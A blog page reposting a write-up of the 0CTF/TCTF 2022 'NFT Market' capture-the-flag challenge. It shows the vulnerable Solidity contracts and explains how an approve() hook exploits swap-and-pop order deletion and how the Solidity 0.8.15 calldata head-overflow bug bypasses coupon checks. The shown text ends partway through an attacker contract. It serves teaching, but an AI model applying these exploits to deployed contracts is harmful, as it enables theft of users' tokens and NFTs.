@@ -1,0 +1,591 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>0CTF/TCTF 2022 NFT Market (Solidity 0.8.15 calldata bug) | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Solidity 0.8.15 calldata tuple head overflow + 数组 swap 删除 + approve 钩子">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0CTF&#x2F;TCTF 2022 NFT Market (Solidity 0.8.15 calldata bug)">
+<meta property="og:url" content="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Web/0CTF_2022_TCTF_NFT_Market/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="Solidity 0.8.15 calldata tuple head overflow + 数组 swap 删除 + approve 钩子">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="Solidity">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Web/0CTF_2022_TCTF_NFT_Market/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '0CTF/TCTF 2022 NFT Market (Solidity 0.8.15 calldata bug)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2022-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">0CTF/TCTF 2022 NFT Market (Solidity 0.8.15 calldata bug)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-31T16:00:00.000Z" title="发表于 2022-01-01 00:00:00">2022-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-31T16:00:00.000Z" title="更新于 2022-01-01 00:00:00">2022-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="0CTF/TCTF 2022 NFT Market (Solidity 0.8.15 calldata bug)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/58223.html">https://www.ctfiot.com/58223.html</a><br>ID: 58223</p>
+</blockquote>
+<p>&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED</p>
+<p>pragma solidity 0.8.15;</p>
+<p>import “@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC721&#x2F;ERC721.sol”;</p>
+<p>import “@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol”;</p>
+<p>import “@openzeppelin&#x2F;contracts&#x2F;access&#x2F;Ownable.sol”;</p>
+<p>contract TctfNFT is ERC721, Ownable {</p>
+<p>constructor() ERC721(“TctfNFT”, “TNFT”) {</p>
+<p>_setApprovalForAll(address(this), msg.sender, true);</p>
+<p>}</p>
+<p>function mint(address to, uint256 tokenId) external onlyOwner {</p>
+<p>_mint(to, tokenId);</p>
+<p>}</p>
+<p>}</p>
+<p>contract TctfToken is ERC20 {</p>
+<p>bool airdropped;</p>
+<p>constructor() ERC20(“TctfToken”, “TTK”) {</p>
+<p>_mint(address(this), 100000000000);</p>
+<p>_mint(msg.sender, 1337);</p>
+<p>}</p>
+<p>function airdrop() external {</p>
+<p>require(!airdropped, “Already airdropped”);</p>
+<p>airdropped &#x3D; true;</p>
+<p>_mint(msg.sender, 5);</p>
+<p>}</p>
+<p>}</p>
+<p>struct Order {</p>
+<p>address nftAddress;</p>
+<p>uint256 tokenId;</p>
+<p>uint256 price;</p>
+<p>}</p>
+<p>struct Coupon {</p>
+<p>uint256 orderId;</p>
+<p>uint256 newprice;</p>
+<p>address issuer;</p>
+<p>address user;</p>
+<p>bytes reason;</p>
+<p>}</p>
+<p>struct Signature {</p>
+<p>uint8 v;</p>
+<p>bytes32[2] rs;</p>
+<p>}</p>
+<p>struct SignedCoupon {</p>
+<p>Coupon coupon;</p>
+<p>Signature signature;</p>
+<p>}</p>
+<p>contract TctfMarket {</p>
+<p>event SendFlag();</p>
+<p>event NFTListed(</p>
+<p>address indexed seller,</p>
+<p>address indexed nftAddress,</p>
+<p>uint256 indexed tokenId,</p>
+<p>uint256 price</p>
+<p>);</p>
+<p>event NFTCanceled(</p>
+<p>address indexed seller,</p>
+<p>address indexed nftAddress,</p>
+<p>uint256 indexed tokenId</p>
+<p>);</p>
+<p>event NFTBought(</p>
+<p>address indexed buyer,</p>
+<p>address indexed nftAddress,</p>
+<p>uint256 indexed tokenId,</p>
+<p>uint256 price</p>
+<p>);</p>
+<p>bool tested;</p>
+<p>TctfNFT public tctfNFT;</p>
+<p>TctfToken public tctfToken;</p>
+<p>CouponVerifierBeta public verifier;</p>
+<p>Order[] orders;</p>
+<p>constructor() {</p>
+<p>tctfToken &#x3D; new TctfToken();</p>
+<p>tctfToken.approve(address(this), type(uint256).max);</p>
+<p>tctfNFT &#x3D; new TctfNFT();</p>
+<p>tctfNFT.mint(address(tctfNFT), 1);</p>
+<p>tctfNFT.mint(address(this), 2);</p>
+<p>tctfNFT.mint(address(this), 3);</p>
+<p>verifier &#x3D; new CouponVerifierBeta();</p>
+<p>orders.push(Order(address(tctfNFT), 1, 1));</p>
+<p>orders.push(Order(address(tctfNFT), 2, 1337));</p>
+<p>orders.push(Order(address(tctfNFT), 3, 13333333337));</p>
+<p>}</p>
+<p>function getOrder(uint256 orderId) public view returns (Order memory order) {</p>
+<p>require(orderId &lt; orders.length, “Invalid orderId”);</p>
+<p>order &#x3D; orders[orderId];</p>
+<p>}</p>
+<p>function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) {</p>
+<p>require(price &gt; 0, “Invalid price”);</p>
+<p>require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), “Not owner”);</p>
+<p>orders.push(Order(nftAddress, tokenId, price));</p>
+<p>emit NFTListed(msg.sender, nftAddress, tokenId, price);</p>
+<p>return orders.length – 1;</p>
+<p>}</p>
+<p>function cancelOrder(uint256 orderId) external {</p>
+<p>Order memory order &#x3D; getOrder(orderId);</p>
+<p>require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), “Not owner”);</p>
+<p>_deleteOrder(orderId);</p>
+<p>emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId);</p>
+<p>}</p>
+<p>function purchaseOrder(uint256 orderId) external {</p>
+<p>Order memory order &#x3D; getOrder(orderId);</p>
+<p>_deleteOrder(orderId);</p>
+<p>IERC721 nft &#x3D; IERC721(order.nftAddress);</p>
+<p>address owner &#x3D; nft.ownerOf(order.tokenId);</p>
+<p>tctfToken.transferFrom(msg.sender, owner, order.price);</p>
+<p>nft.safeTransferFrom(owner, msg.sender, order.tokenId);</p>
+<p>emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price);</p>
+<p>}</p>
+<p>function purchaseWithCoupon(SignedCoupon calldata scoupon) external {</p>
+<p>Coupon memory coupon &#x3D; scoupon.coupon;</p>
+<p>require(coupon.user &#x3D;&#x3D; msg.sender, “Invalid user”);</p>
+<p>require(coupon.newprice &gt; 0, “Invalid price”);</p>
+<p>verifier.verifyCoupon(scoupon);</p>
+<p>Order memory order &#x3D; getOrder(coupon.orderId);</p>
+<p>_deleteOrder(coupon.orderId);</p>
+<p>IERC721 nft &#x3D; IERC721(order.nftAddress);</p>
+<p>address owner &#x3D; nft.ownerOf(order.tokenId);</p>
+<p>tctfToken.transferFrom(coupon.user, owner, coupon.newprice);</p>
+<p>nft.safeTransferFrom(owner, coupon.user, order.tokenId);</p>
+<p>emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);</p>
+<p>}</p>
+<p>function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external {</p>
+<p>require(!tested, “Tested”);</p>
+<p>tested &#x3D; true;</p>
+<p>IERC721 nft &#x3D; IERC721(nftAddress);</p>
+<p>uint256 orderId &#x3D; TctfMarket(this).createOrder(nftAddress, tokenId, price);</p>
+<p>nft.approve(address(this), tokenId);</p>
+<p>TctfMarket(this).purchaseOrder(orderId);</p>
+<p>}</p>
+<p>function win() external {</p>
+<p>require(tctfNFT.ownerOf(1) &#x3D;&#x3D; msg.sender &amp;&amp; tctfNFT.ownerOf(2) &#x3D;&#x3D; msg.sender &amp;&amp; tctfNFT.ownerOf(3) &#x3D;&#x3D; msg.sender);</p>
+<p>emit SendFlag();</p>
+<p>}</p>
+<p>function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) {</p>
+<p>IERC721 nft &#x3D; IERC721(nftAddress);</p>
+<p>address owner &#x3D; nft.ownerOf(tokenId);</p>
+<p>return (spender &#x3D;&#x3D; owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) &#x3D;&#x3D; spender);</p>
+<p>}</p>
+<p>function _deleteOrder(uint256 orderId) internal {</p>
+<p>orders[orderId] &#x3D; orders[orders.length – 1];</p>
+<p>orders.pop();</p>
+<p>}</p>
+<p>function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {</p>
+<p>return this.onERC721Received.selector;</p>
+<p>}</p>
+<p>}</p>
+<p>contract CouponVerifierBeta {</p>
+<p>TctfMarket market;</p>
+<p>bool tested;</p>
+<p>constructor() {</p>
+<p>market &#x3D; TctfMarket(msg.sender);</p>
+<p>}</p>
+<p>function verifyCoupon(SignedCoupon calldata scoupon) public {</p>
+<p>require(!tested, “Tested”);</p>
+<p>tested &#x3D; true;</p>
+<p>Coupon memory coupon &#x3D; scoupon.coupon;</p>
+<p>Signature memory sig &#x3D; scoupon.signature;</p>
+<p>Order memory order &#x3D; market.getOrder(coupon.orderId);</p>
+<p>bytes memory serialized &#x3D; abi.encode(</p>
+<p>“I, the issuer”, coupon.issuer,</p>
+<p>“offer a special discount for”, coupon.user,</p>
+<p>“to buy”, order, “at”, coupon.newprice,</p>
+<p>“because”, coupon.reason</p>
+<p>);</p>
+<p>IERC721 nft &#x3D; IERC721(order.nftAddress);</p>
+<p>address owner &#x3D; nft.ownerOf(order.tokenId);</p>
+<p>require(coupon.issuer &#x3D;&#x3D; owner, “Invalid issuer”);</p>
+<p>require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) &#x3D;&#x3D; coupon.issuer, “Invalid signature”);</p>
+<p>}</p>
+<p>}</p>
+<p>Colored by Color Scripter</p>
+<p>cs</p>
+<p>Problem Summary</p>
+<p>The goal here is to emit the event SendFlag(). To do so, we need to gain control of all three NFTs.</p>
+<p>In the contract file, there is an ERC721 called “TctfNFT” and ERC20 called “TctfToken”. We also see that during the initialization the marketplace contract gets 1337 TctfTokens. In the market’s constructor, three NFTs are minted, the first to the NFT contract and the other to the market contract. These three NFTs are put on sale on a price of 1, 1337, and some insanely large price. We’ll have to get all these NFTs.</p>
+<p>Looking at the contract’s methods, we see that</p>
+<p>We may get an airdrop of 5 tokens but only once.</p>
+<p>We can create a sell order of NFT under the condition that we have control (approval or owner) over it.</p>
+<p>We can cancel a sell order of NFT under the condition that we have control over it.</p>
+<p>We can purchase an order of NFT with enough tokens.</p>
+<p>We can purchase an order of NFT with a coupon, but only once. The issuer of the coupon should be the NFT owner, and we have to supply the signature of the issuer for the coupon. For this problem, we pretty much have to know the private key of the issuer.</p>
+<p>We can use purchaseTest() function only once. Here, the market creates one order and purchases it on its own.</p>
+<p>Approach</p>
+<p>The constraint gives us some hints on how to approach the problem.</p>
+<p>The first NFT is very cheap, so we can purchase without any trickery. The two functions purchaseTest() and purchaseWithCoupon() are very suspicious, and we can use these only once each. Therefore, each suspicious functions will have us stealing one NFT. Since purchaseWithCoupon() function gives us power to change a price of an order, we should use it to buy the third NFT. The second NFT costs 1337 tokens, and it just happens that the market contract holds 1337 tokens. Therefore, we should use purchaseTest function to steal those tokens.</p>
+<p>Part 1: The purchaseTest()</p>
+<p>There are multiple ways to solve this part of the problem. I’ll show my solution and sqrtrev’s solution.</p>
+<p>The dangerous thing about many of the market’s methods is that it takes the order ID as input. If we simply used a mapping for these orders, it would probably not be a problem. However, we use a variable length array to handle our orders. To keep our array length the same as the number of valid orders, we use a nice algorithm which can be seen in _deleteOrder(). When an element of the array is deleted, the element at the back is put at the location of the deleted element. This is also a strategy used in OpenZeppelin’s EnumerableSet contracts to keep index of the elements. Now we see the problem – the value at a specific index may change due to element addition and deletion.</p>
+<p>Now let’s take a look at the purchaseTest() function again. It creates order, then purchases the order.</p>
+<p>If we look at the createOrder() function again, we see that the only external calls are done to simply check the approval or ownership, but those are done with staticcalls. Therefore, we can’t use that to attack. We also see that we can’t perform the attack in purchaseOrder(). Thankfully for us, there is an approve call to the NFT address. This can definitely be used to our advantage.</p>
+<p>Basically, we create a dumb NFT and send it to the TctfMarket. We call purchaseTest() with the NFT.</p>
+<p>Inside the approve() call, we will create another order, which sells a dumb NFT that we own at 1337 tokens. Then, we will remove the order that we just created. This will make the order at the order ID equal to the “sell dumb NFT at 1337 token” order. Now the market will happily purchase this new order, sending us 1337 tokens. This gives us enough funds to buy the second NFT anytime we want.</p>
+<p>sqrtrev’s solution is much simple, it simply sends the NFT that is being sold at purchaseTest() to our EOA at the approve() call. Inside the purchaseOrder() function, we see that the funds are sent to the owner of the token, so it’ll be sent to us. Looking back, I overcomplicated this part of the problem. Part of it is because I took a look at EnumerableSet recently, I guess. It’s all very cool ideas, so it’s good.</p>
+<p>Part 2: The purchaseWithCoupon()</p>
+<p>The first thing we have to notice is that verifyCoupon() is practically a view function. The getOrder() function inside is  view, so it’ll be done with staticcall. The ownerOf() function is also view, so staticcall will be used. Therefore, we can’t use the same idea to re-enter with a different order at coupon’s order ID. Therefore, we can’t do anything malicious until the token transfers come in.</p>
+<p>We initially thought that the ideas from Part 1 still work, so I wrote all scripts and then realized that it doesn’t work.</p>
+<p>I believed that a compiler bug must be the way to go, and began searching on solidity’s list of known bugs.</p>
+<p>Then I came across <a target="_blank" rel="noopener" href="https://blog.soliditylang.org/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/">https://blog.soliditylang.org/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/</a></p>
+<p>Head Overflow Bug in Calldata Tuple ABI-Reencoding</p>
+<p>On July 5, 2022, Chance Hudson (@vimwitch) from the Ethereum Foundation discovered a bug in the Solidity code generator. The earliest affected version of the compiler is 0.5.8, which introduced ABI-reencoding of calldata arrays and structs. Solidity versio</p>
+<p>blog.soliditylang.org</p>
+<p>Literally everything matched the challenge –</p>
+<p>This solidity bug was patched in 0.8.16. The challenge uses 0.8.15.</p>
+<p>It’s stated that the last component must be static-sized array. It is bytes32[2].</p>
+<p>It’s stated that one dynamic component is needed. There is a bytes value.</p>
+<p>The bug clears the first 32 bytes of the first dynamic tuple. That happens to be order ID.</p>
+<p>In the blog, it is stated that “Plausible attacks against affected contracts can only occur in situations where the contract accepts a static calldata array as a part of its input and forwards it to another external call without modifying the content.” This is exactly what happens in purchaseWithCoupon() and verifyCoupon(). The SignedCoupon struct is sent in as a calldata, and it’s directly forwarded.</p>
+<p>Some testing shows that if we send a SignedCoupon with order ID 1, it’s forwarded to verifyCoupon with order ID 0.</p>
+<p>This means that if we have some order that we control at order 0 and the order for the third NFT at some other place, we can use the coupon. This is because the order used to verify the coupon is the order 0, which we own the NFT of. This means that we can sign our own coupon, but use it on the order for the third NFT with the solidity bug. All that’s left is to combine these.</p>
+<p>Part 3: Combining Everything</p>
+<p>We’ll denote the order for the NFTs that we need to get as order #1, #2, #3. We note that for the bug at Part 2, we need a order that we control at the order ID 0. With this in mind, we will set up our attack as follows. We’ll use sqrtrev’s approach on Part 1.</p>
+<p>Get the TctfToken airdrop. Currently, the orders on the market is [#1, #2, #3].</p>
+<p>Perform sqrtrev’s attack. We’ll get 1337 tokens, and the orders on the market is still [#1, #2, #3].</p>
+<p>We’ll buy NFT #2 with our 1337 tokens, and the orders on the market is [#1, #3]</p>
+<p>We’ll mint a dumb NFT to ourself, and create an order. The orders on the market is [#1, #3, us].</p>
+<p>Now we’ll buy NFT #1 with 1 token. The orders on the market is [us, #3].</p>
+<p>Now the order ID 0 is an order we control – so the attack from Part 2 works. We buy NFT #3 with 1 token.</p>
+<p>This will give us the flag. Foundry testing is very easy to do, but hardhat scripting was a bit painful. It can be done though.</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>7</p>
+<p>8</p>
+<p>9</p>
+<p>10</p>
+<p>11</p>
+<p>12</p>
+<p>13</p>
+<p>14</p>
+<p>15</p>
+<p>16</p>
+<p>17</p>
+<p>18</p>
+<p>19</p>
+<p>20</p>
+<p>21</p>
+<p>22</p>
+<p>23</p>
+<p>24</p>
+<p>25</p>
+<p>26</p>
+<p>27</p>
+<p>28</p>
+<p>29</p>
+<p>30</p>
+<p>31</p>
+<p>32</p>
+<p>33</p>
+<p>34</p>
+<p>35</p>
+<p>36</p>
+<p>37</p>
+<p>38</p>
+<p>39</p>
+<p>40</p>
+<p>41</p>
+<p>42</p>
+<p>43</p>
+<p>44</p>
+<p>45</p>
+<p>46</p>
+<p>47</p>
+<p>48</p>
+<p>49</p>
+<p>50</p>
+<p>51</p>
+<p>52</p>
+<p>53</p>
+<p>54</p>
+<p>55</p>
+<p>56</p>
+<p>57</p>
+<p>58</p>
+<p>59</p>
+<p>60</p>
+<p>61</p>
+<p>62</p>
+<p>63</p>
+<p>64</p>
+<p>65</p>
+<p>66</p>
+<p>67</p>
+<p>68</p>
+<p>69</p>
+<p>70</p>
+<p>71</p>
+<p>72</p>
+<p>73</p>
+<p>74</p>
+<p>75</p>
+<p>76</p>
+<p>77</p>
+<p>78</p>
+<p>79</p>
+<p>80</p>
+<p>81</p>
+<p>82</p>
+<p>83</p>
+<p>84</p>
+<p>85</p>
+<p>86</p>
+<p>87</p>
+<p>88</p>
+<p>89</p>
+<p>90</p>
+<p>91</p>
+<p>92</p>
+<p>93</p>
+<p>94</p>
+<p>95</p>
+<p>96</p>
+<p>97</p>
+<p>98</p>
+<p>99</p>
+<p>100</p>
+<p>101</p>
+<p>102</p>
+<p>103</p>
+<p>104</p>
+<p>105</p>
+<p>106</p>
+<p>107</p>
+<p>108</p>
+<p>109</p>
+<p>&#x2F;&#x2F; FakeNFT for attack</p>
+<p>&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED</p>
+<p>pragma solidity 0.8.15;</p>
+<p>import “@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC721&#x2F;ERC721.sol”;</p>
+<p>import “@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol”;</p>
+<p>import “.&#x2F;Task.sol”;</p>
+<p>contract FakeNFT is ERC721 {</p>
+<p>uint256 called &#x3D; 0;</p>
+<p>uint256 approved &#x3D; 0;</p>
+<p>TctfMarket market;</p>
+<p>TctfToken token;</p>
+<p>constructor() ERC721(“FakeNFT”, “FNFT”) {</p>
+<p>_setApprovalForAll(address(this), msg.sender, true);</p>
+<p>}</p>
+<p>function getParams(address t1, address t2) public {</p>
+<p>market &#x3D; TctfMarket(t1);</p>
+<p>token &#x3D; TctfToken(t2);</p>
+<p>}</p>
+<p>function mint(address to, uint256 tokenId) external {</p>
+<p>_mint(to, tokenId);</p>
+<p>}</p>
+<p>function approve(address dest, uint256 tokenId) public override {</p>
+<p>if(approved &#x3D;&#x3D; 0) {</p>
+<p>super.safeTransferFrom(msg.sender, USER, 1); &#x2F;&#x2F; sqrtrev’s code: he hardcoded USER here</p>
+<p>} else {</p>
+<p>super.approve(dest, tokenId);</p>
+<p>}</p>
+<p>approved +&#x3D; 1;</p>
+<p>}</p>
